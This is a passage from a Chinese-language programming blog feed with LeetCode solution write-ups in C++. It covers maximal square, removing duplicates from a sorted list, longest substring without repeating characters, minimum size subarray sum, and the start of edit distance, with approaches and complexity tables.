        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/221/question.jpeg"><br><img src="/img/LeetCode/221/question2.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定一個 <code>m x n</code> 大小的二元陣列 <code>matrix</code> (由 <code>0</code>, <code>1</code> 填充而成)，請找出僅包含 <code>1</code> 的最大正方形面積。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這個問題要找出 <strong>僅包含 <code>1</code> 的最大正方形面積</strong> ，可以拆分成兩個問題，第一個就是 <strong>如何找出正方形面積?</strong> 第二個就是 <strong>如何比較出最大的面積?</strong> 我最初的想法還是偏向暴力解，如果將矩陣的右下角定為起點，那正方形就會是任意點 <code>(i, j)</code> 往上以及往左圍出的區域</p><p><img src="/img/LeetCode/221/algo1.png"></p><h2 id="我的解法-暴力解"><a href="#我的解法-暴力解" class="headerlink" title="我的解法 - 暴力解"></a>我的解法 - 暴力解</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(matrix.<span class="built_in">empty</span>() || matrix[<span class="number">0</span>].<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> area =<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=m<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=n<span class="number">-1</span>; j&gt;=<span class="number">0</span>; j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j] == <span class="string">&#x27;0&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>( i-k &gt;=<span class="number">0</span> &amp;&amp; j-k &gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="type">bool</span> validSquare = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt;= k; x++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (matrix[i - k][j - x] == <span class="string">&#x27;0&#x27;</span> || matrix[i - x][j - k] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                            validSquare = <span class="literal">false</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(!validSquare) <span class="keyword">break</span>;</span><br><span class="line">                    k++;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                area = <span class="built_in">max</span>(area, k*k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> area;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>程式邏輯就是從右下角，先一路往左檢查該列作為起始點的正方形大小，接著往上一層一樣由右往左的一路重新計算。在最內層迴圈中，一旦檢查到起點周圍有包含 <code>0</code>，則跳出。若無則繼續檢查，最後會計算包圍出的面積大小 <code>area = max(area, k*k);</code></p><blockquote><p>但這種做法在陣列巨大時，會非常沒有效率，因此執行結果為 Time Limit Excceded !</p></blockquote><h2 id="最佳化最法"><a href="#最佳化最法" class="headerlink" title="最佳化最法"></a>最佳化最法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(matrix.<span class="built_in">empty</span>() || matrix[<span class="number">0</span>].<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        </span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m , <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>));</span><br><span class="line">        <span class="type">int</span> maxSide =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;n; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i == <span class="number">0</span> || j==<span class="number">0</span>) dp[i][j] = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        dp[i][j] = <span class="built_in">min</span>(&#123;dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>], dp[i<span class="number">-1</span>][j<span class="number">-1</span>]&#125;) + <span class="number">1</span>;   </span><br><span class="line">                    &#125;</span><br><span class="line">                    maxSide = <span class="built_in">max</span>(maxSide, dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxSide * maxSide;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡首先定義一個二維陣列 <code>dp[i][j]</code>，它代表 <strong>以 <code>(i , j)</code> 為右下角的正方形的最大邊長</strong> ， <strong>如果 <code>matrix[i][j]</code> 是 <code>1</code>，則其作為右下角的最大邊長由其上方，左方以及左上方正方形的最小邊長決定</strong>。而首先對於矩陣的第一行或第一列，他們作為正方形右下角，僅能包含出最大邊長為 1  的正方形，因此算是 base case。</p><p>今天如果想要知道以 <code>(2,2)</code> 為右下角正方形的最大邊長，就要查找 <code>dp[2][1]</code>, <code>dp[1][2]</code>, <code>dp[1][1]</code> 為右下角正方形的最大邊長，需要找最小的正方形，這裡最小的值為 0，其實就代表以 <code>(2,2)</code> 為右下角，僅能包圍出邊長大小為 <code>1</code> 的正方形，也就是 <code>(2,2)</code> 自己的那格。</p><p><img src="/img/LeetCode/221/algo2.png"></p><p>但如果我們看 <code>(2,3)</code>，則可發現 <code>dp[2][2]</code>, <code>dp[1][3]</code>, <code>dp[1][2]</code> 皆為 <code>1</code>，這代表能包圍出的正方形邊長為 <code>2</code>，對應看到 <code>matrix</code> 也可以發現確實存在 <code>2 x 2</code> 大小的正方形。 </p><p><img src="/img/LeetCode/221/algo3.png"></p><p>函數的最後回傳最大邊長的平方，即為最大正方形的面積</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/221/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>作法</th><th><strong>時間複雜度</strong></th><th><strong>空間複雜度</strong></th><th><strong>分析過程</strong></th></tr></thead><tbody><tr><td><strong>暴力解法</strong></td><td>$O(m \cdot n \cdot \min(m, n)^2)$</td><td>$O(1)$</td><td>每個位置 $(i, j)$ 嘗試擴展正方形，內層迴圈驗證正方形是否合法，最大邊長取決於矩陣的最小維度（高度或寬度）</td></tr><tr><td><strong>動態規劃解法</strong></td><td>$O(m \cdot n)$</td><td>$O(m \cdot n)$ 或 $O(n)$</td><td>每個位置只需要比較上方、左方和左上方的 DP 值，透過動態規劃表記錄結果，避免重複計算，計算時間與矩陣大小線性相關</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Multidimensional DP </tag>
            
            <tag> Matrix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從排序串鏈移除重複節點 II | Medium | LeetCode#82. Remove Duplicates from Sorted List II</title>
      <link href="/posts/947efc60.html"/>
      <url>/posts/947efc60.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/82/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述：給定一個排序鏈結的 <code>head</code>，刪除所有具有重複數字的節點，使原有鏈結最後只剩下相異的數值的節點，並回傳該list的 <code>head</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>由於要檢查是否有數值重複，因此這部分會想到要用 Hash Table 來實現，並且移除重複節點，還需要一個dummy head 搭新的指標來去指向前一個節點。</p><h2 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>; </span><br><span class="line">        unordered_map &lt;<span class="type">int</span>, <span class="type">int</span>&gt; umap;</span><br><span class="line">        ListNode *ptr = head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Iterate over the list</span></span><br><span class="line">        <span class="keyword">while</span>( ptr!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            umap[ptr-&gt;val]++;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>, head);</span><br><span class="line">        ListNode *prev = dummy;</span><br><span class="line">        ptr = head;</span><br><span class="line">        <span class="keyword">while</span>(ptr!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(umap[ptr-&gt;val]&gt;<span class="number">1</span>)&#123;</span><br><span class="line">                prev-&gt;next = ptr-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                prev = ptr;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡宣告一個 <code>unordered_map&lt;int, int&gt;</code> 分別以節點值作為 key 而出現次數作為 value，另外新建立一個指向 <code>head</code> 的 dummy head 並且新建立指標 <code>prev</code> 隨時指向 <code>ptr</code> 之前的節點。 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>, head);</span><br><span class="line">ListNode *prev = dummy;</span><br></pre></td></tr></table></figure><p>接著就是移動 <code>ptr</code> 若發現節點值有出現過 <code>umap[ptr-&gt;val]&gt;1</code> 則跳過當前節點，讓前一個節點接到當前節點的下一個節點 <code>prev-&gt;next = ptr-&gt;next</code>，反之則值正常的移動節點 <code>prev = ptr</code>,<code>ptr = ptr-&gt;next</code>。最後只要回傳 <code>dummy</code> 的下一個點即可。 </p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/82/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th><strong>複雜度類型</strong></th><th><strong>複雜度</strong></th><th><strong>分析</strong></th></tr></thead><tbody><tr><td><strong>時間複雜度</strong></td><td>$O(n)$</td><td>需要兩次遍歷鏈結串列。第一次用於建立頻率表（$O(n)$），第二次用於移除重複節點（$O(n)$），因此總時間複雜度為線性</td></tr><tr><td><strong>空間複雜度</strong></td><td>$O(n)$</td><td>使用了一個 <code>unordered_map</code>（哈希表）來儲存每個節點值的頻率，所需的空間取決於鏈結串列中唯一值的數量</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>無重複字元的最長字串 | Medium | LeetCode#3. Longest Substring Without Repeating Characters</title>
      <link href="/posts/5701a21.html"/>
      <url>/posts/5701a21.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/3/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目描述：給定一個字串 <code>s</code>，求最長子字串的長度，並且該子字串中不能有重複的字元</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題的暴力解就會是透過雙重迴圈來去找各種子字串，然後查找多種不同非重複子字串的長度，然後回傳最長的那個，但在迴圈查找過程中，由於要查找的是輸入資料中的變動長度的字串，因此可以用 sliding window 來解題。其中在確認字元是否重複的過程，則可以用Hash Table 來去儲存和查找。</p><h2 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span>  <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>, right=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxLength = <span class="number">0</span>;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; umap;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find substrings</span></span><br><span class="line">        <span class="comment">// Checking if the characters are repeated</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> right=<span class="number">0</span>; right&lt; s.<span class="built_in">size</span>(); right++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(umap.<span class="built_in">find</span>(s[right])!=umap.<span class="built_in">end</span>() &amp;&amp; umap[s[right]]&gt;=left)&#123;</span><br><span class="line">                left = umap[s[right]]+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            umap[s[right]]= right;</span><br><span class="line">            maxLength= <span class="built_in">max</span>(maxLength, right - left+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLength;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先排除邊界條件，<code>s</code> 如果為空則回傳 0，接著定義用於夾出window 的兩個變數 <code>left</code> 以及 <code>right</code>，以及紀錄最長長度用的變數 <code>maxLength</code> 和用於紀錄重複字元的 <code>umap</code>。接著就需要去透過移動 <code>right</code> 的大小來擴展窗口，這當中會去將字元以及其對應的 index 紀錄到 <code>umap</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umap[s[right]] = right;</span><br></pre></td></tr></table></figure><p>而如果沒有重複字元，則當前子字串長度會去跟 <code>maxLength</code> 比較找出最長長度值，然後更新到 <code>maxLength</code>。 而一旦在操作窗口中發現字元重複並且該字元對應的 index 值不小於 <code>left</code>，這時就需要去更新 <code>left</code> 的值，也就是要縮小窗口 <code>left = umap[s[right]]+1</code>， <strong>這個步驟會是要讓窗口從先前紀錄的重複字元的下一個元素，作為新的窗口邊界來檢查是否有更新的子字串。</strong></p><p><img src="/img/LeetCode/3/algo.png"></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/3/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th><strong>操作</strong></th><th><strong>時間複雜度</strong></th><th><strong>空間複雜度</strong></th><th><strong>分析</strong></th></tr></thead><tbody><tr><td>初始化變數（<code>left</code>, <code>right</code>, <code>umap</code>）</td><td>$O(1)$</td><td>$O(1)$</td><td>初始化常數時間與空間。</td></tr><tr><td><code>for</code> 迴圈遍歷字串</td><td>$O(n)$</td><td>$O(n)$</td><td>迴圈執行 $ n $ 次，每個字元只會被訪問一次，因此時間複雜度為 $ O(n) $。空間複雜度來自 <code>unordered_map</code> 存儲最多 $ n $ 個字元的位置（當所有字元都唯一時）。</td></tr><tr><td>更新 <code>unordered_map</code></td><td>$O(1)$</td><td>$O(n)$</td><td>插入或更新 <code>unordered_map</code> 中的字元索引操作為 $ O(1) $。</td></tr><tr><td>計算子字串長度</td><td>$O(1)$</td><td>$O(1)$</td><td>計算當前子字串長度是常數時間操作。</td></tr><tr><td><strong>總計</strong></td><td>$O(n)$</td><td>$O(n)$</td><td>主迴圈和 <code>unordered_map</code> 操作總共耗時 $ O(n) $。空間複雜度受限於字串長度和字符集大小。</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Sliding Window </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>長度最小的子陣列和 | Medium | LeetCode#209. Minimum Size Subarray Sum</title>
      <link href="/posts/33b92d95.html"/>
      <url>/posts/33b92d95.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/209/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 給定一個整數陣列 <code>nums</code>，以及正整數 <code>target</code>，請回傳長度最短的子陣列，其所有元素和大於或等於 <code>target</code> 值。若沒有任何子陣列，則回傳 0</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題的關鍵就是要 <strong>回傳滿足條件的子陣列</strong> ，因此可以很直覺地聯想到要用 sliding windo來去找出滿足要求的子陣列。</p><h2 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>, right=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> length = INT_MAX;</span><br><span class="line">        <span class="keyword">while</span>(right &lt; nums.<span class="built_in">size</span>())&#123;</span><br><span class="line"></span><br><span class="line">            sum += nums[right];</span><br><span class="line">            <span class="keyword">while</span>( sum &gt;= target)&#123;</span><br><span class="line">                length = <span class="built_in">min</span>(length,right - left+<span class="number">1</span>);</span><br><span class="line">                sum -= nums[left];</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(length==INT_MAX) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先定義出用於夾出窗口的 <code>left</code> 以及 <code>right</code>，以及用於保存元素和的 <code>sum</code>，另外還有紀錄子陣列長度的 <code>length</code>，接著就是 sliding window 的標準流程：</p><ul><li>擴展窗口</li><li>滿足條件</li><li>操作窗口</li><li>收縮窗口</li></ul><p>透過移動 <code>right</code> 來擴展窗口，每次移動過程就去將 <code>num</code> 中元素加入到 <code>sum</code>，一旦當前元素總和 <code>sum&gt;= target</code>，則代表條件滿足，接著就是找出當前子陣列長度是否與先前儲存的 <code>length</code> 誰比較小，並更新到 <code>length</code>，接著就是要收縮窗口，也就是要移動 <code>left</code>，在過程中先前加入到 <code>sum</code> 的元素也需要被扣除。 跑完迴圈後就回傳 <code>length</code></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/209/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th><strong>複雜度類型</strong></th><th><strong>複雜度值</strong></th><th><strong>分析</strong></th></tr></thead><tbody><tr><td><strong>時間複雜度</strong></td><td>$O(n)$</td><td>由於使用了雙指針方法，每個元素最多被訪問兩次（右指針和左指針各一次，最多只會是 $2n$），因此是線性時間複雜度</td></tr><tr><td><strong>空間複雜度</strong></td><td>$O(1)$</td><td>僅使用了固定數量的變數（<code>left</code>、<code>right</code>、<code>sum</code>、<code>length</code>），沒有使用額外的空間</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Sliding Window </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>編輯距離 | Medium | LeetCode72. Edit Distance</title>
      <link href="/posts/1dfdcfbe.html"/>
      <url>/posts/1dfdcfbe.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/72/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給定兩個字串 <code>word1</code> 和 <code>word2</code>，請回傳 <strong>由 <code>word1</code> 轉換成 <code>word2</code> 所需的最少步驟數</strong> ， 步驟有分三種，<strong>分別是 1.插入字元 2. 刪除字元 3.取代字元</strong></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題我是參考了 <a href="https://www.youtube.com/watch?v=XYi2-LPrwm4">neetcode 的前半段影片</a> 解釋題目，才比較有想法 (話說原來這題在兩年前是 HARD..)。其實想法上就是要去比較 <code>word1</code> 和 <code>word2</code> 的所有字元，逐一比較。如果一樣就換下一個，如果不一樣，則需要去比較三個操作何種會有最小的步驟數。</p><p><img src="/img/LeetCode/72/algo.png"></p><ul><li>如果是要插入，則步驟數加一，並且接下來需要將 <code>j+1</code> 而 <code>i</code> 不用動，因為 <code>i</code> 還是指向那個不匹配的字元，因此需要看 <code>word2</code> 後續字元是否能夠匹配</li><li>如果是刪除，則步驟數加一，並且 <code>j</code> 不動，但要看下一個 <code>word1</code> 字元能否跟當前的 <code>word2[j]</code> 匹配，因此 <code>i+1</code></li><li>如果是取代，則步驟數加一，並且　<code>i</code> 跟 <code>j</code> 都加一，因為取代的話就是字元會相通，就可以換下一組子字元進行比較了</li></ul><p><img src="/img/LeetCode/72/q1.png"></p><p>問題可以被 model 成一個二維陣列，代表 <code>word1</code> 對應到 <code>word2</code> 的所需轉換步驟數，整體問題都可以切分成像是下圖這樣的子問題， <strong><code>abc</code> 對應到 <code>acb</code> 轉換所需最少步驟數會由 <code>bc</code> 對應到 <code>cb</code> 這個子問題貢獻出來</strong> </p><p><img src="/img/LeetCode/72/q2.png"></p><p>接著，如果 <code>word1</code> 或 <code>word2</code> 為空字串， <strong>則所需步驟數等同於對方長度</strong>，因此陣列的最後一列和最後一行都會按照對方的長度依序減少。處理好 base case 後，實際在進行比較時，就是在比較陣列的行跟列，如果 <code>i,j</code> 相等，則 <code>i+1,j+1</code> 也就是移動到斜對角，如果不相等，則需要去比較三個操作何種會有最小的步驟數，選小的並且加一(代表選擇刪除、取代或插入，各都為一個步驟數)，選最小的接續下去。 如此跌代完畢後，最後 <code>[0][0]</code> 就會儲存我們整體所需的最小步驟數。</p><p><img src="/img/LeetCode/72/q3.png"></p><h2 id="我的解法"><a 